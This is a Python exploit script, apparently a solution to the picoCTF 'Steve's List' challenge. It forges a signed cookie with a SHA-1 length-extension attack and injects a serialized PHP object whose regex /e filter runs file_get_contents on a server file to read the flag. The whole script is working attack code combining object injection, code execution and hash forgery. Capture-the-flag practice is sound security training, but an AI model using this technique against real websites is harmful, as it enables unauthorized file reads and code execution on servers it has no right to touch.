import subprocess
import urllib
import commands
import sys
import hlextend
import urllib2
import cookielib
import requests
import subprocess

def php_urlencode(s):
    '''Return php urlencoded string'''
    print "ENCODE: " + s
    s = s.replace("\x00", "\0")
    encode_php = "<?php $text = <<<EOD\n{}\nEOD;\necho urlencode($text);\n?>".format(s)

    with open('encode_me.php', 'w') as f:
        f.write(encode_php)

    output = subprocess.check_output('php encode_me.php', shell=True)
    return output

url = 'http://steveslist.picoctf.com'
flag_file = '/home/daedalus/flag.txt'
php_script = """
<?php
require_once('steves_list_backup/includes/classes.php');
$filter = [new Filter('/^(.*)/e', 'file_get_contents(\\\'{}\\\')')];

$text = "file_get_contents";
$text = htmlspecialchars($text);

$title = "yay_flag";
$title = htmlspecialchars($title);

$post = new Post($title, $text, $filter);

$post_ser = serialize($post);

$ser = $post_ser;
echo $ser;
?>
""".format(flag_file)

with open('phpscript.php', 'w') as f:
    f.write(php_script)

php_output = subprocess.check_output('php phpscript.php', shell=True, stderr=subprocess.STDOUT)
php_output = php_output.split('<')[0].split('\n')[1]

original_hash = '2141b332222df459fd212440824a35e63d37ef69'
original_data = 'b:1;'
# '\x0a' is our new line delimiter
appended_data = '\x0a' + php_output
key_length = 8

sha = hlextend.new('sha1')
cookie = sha.extend(appended_data, original_data, key_length, original_hash)
cookie_hash = sha.hexdigest()

output = php_urlencode(cookie)
cookies = {'custom_settings_hash': cookie_hash,
           'custom_settings': output}
results = requests.get(url, cookies=cookies).text
print [line for line in results.split('\n') if 'yay_flag' in line]
